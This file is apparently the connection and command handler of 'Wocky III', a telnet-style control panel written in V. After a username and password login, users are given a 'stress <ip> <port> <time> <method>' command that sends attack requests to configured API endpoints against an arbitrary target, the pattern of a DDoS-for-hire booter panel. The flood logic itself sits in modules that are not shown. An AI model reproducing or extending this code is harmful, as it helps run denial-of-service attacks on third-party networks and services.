module wocky

import os
import io
import net
import time

import core
import auth
import crud
import config
import wocky
import utilities
import term_control
import attack_system

import commands // List of Commands


pub fn connection_handler(mut socket net.TcpConn, mut w wocky.Wocky) { 
	mut reader := io.new_buffered_reader(reader: socket)
	mut ui_settings := core.Terminal{}
	mut buffer := core.Buffer{}
	user_addr := socket.peer_addr() or { return } // This should almost never return an err
	user_ip := "${user_addr}".replace("[::ffff:","").split("]:")[0]
	user_port := "${user_addr}".split("]:")[1]
	mut term_size := w.terminal.size.split(",")
	if term_size.len > 0 {
		term_control.change_size(term_size[0], term_size[1], mut socket)
	}

	if w.terminal.title != "" {
		term_control.change_title(w.terminal.title, mut socket)
	}

	
	socket.write_string("${config.Red}Username: ${config.Default}") or { 0 }
	username := reader.read_line() or { "" }
	socket.write_string("${config.Red}Password: ${config.Black}") or { 0 }
	password := reader.read_line() or { "" }
	socket.write_string("${config.Default}") or { 0 }

	// Have to do a auth check here with the username and password later
	mut login_check, user_info := auth.login(username, password, user_ip, mut w.sqlconn)
	if login_check == 0 {
		socket.write_string("${config.Clear}${config.Red}[x] Error, No user found.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	} else if login_check == -1 {
		socket.write_string("${config.Clear}${config.Red}[x] Error, Invalid username or password.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	}

	socket.write_string(config.Clear) or { 0 }
	w.clients.add_session(username, mut socket, user_ip, user_port)
	socket.write_string("Welcome to Wocky III\r\n") or { 0 }
	println("${config.Green}[${utilities.current_time()}][+]${config.Default} User succesfully logged in. ${username} | ${user_ip}")
	println("${config.Green}[${utilities.current_time()}][+]${config.Default} Users Connected: ${w.clients.count}")

	command_handler(mut socket, mut &w, user_info)
}

pub fn command_handler(mut socket net.TcpConn, mut w wocky.Wocky, db_user_info map[string]string) {
	mut username, ip, port := w.clients.get_session_info(mut socket)
	mut buffer := core.Buffer{}
	mut reader := io.new_buffered_reader(reader: socket)
	for {
		socket.write_string("[Wocky@NET]~ $ ") or { 
			w.clients.remove_session(mut socket)
			socket.close() or { return }
			return 
		}
		input_cmd := reader.read_line() or { 
			w.clients.remove_session(mut socket)
			socket.close() or { return }
			return
		}
		if input_cmd.replace("\r\n", "").len > 2 {
			buffer.parse(input_cmd)

			match buffer.cmd {
				"help", "?" {
					socket.write_string("working\r\n") or { 
						w.clients.remove_session(mut socket)
						socket.close() or { return }
						return
					}
				}
				"clear" {
					socket.write_string(config.Clear) or { 0 }
				}
				"stress" {
					// Stress Usage: stress <ip> <port> <time> <method>
					if buffer.cmd_args.len < 5 {
						socket.write_string("[x] Error, Invalid argument\nUsage: stress <ip> <port> <time> <method>") or { 0 }
					} else {
						mut api_names, api_urls/*, api_maxtime, api_conn*/ := crud.read_apis_with_method_alt(buffer.cmd_args[4])
						t := attack_system.send_api_attack(buffer.cmd_args[1], buffer.cmd_args[2], buffer.cmd_args[3], buffer.cmd_args[4], db_user_info, mut w.sqlconn, api_names, api_urls)
						socket.write_string(t) or { 0 }
					}
				} else {
					socket.write_string("[x] Command not found!\r\n") or { 
						w.clients.remove_session(mut socket)
						socket.close() or { return }
						return
					}
				}
			}
		}
	}

}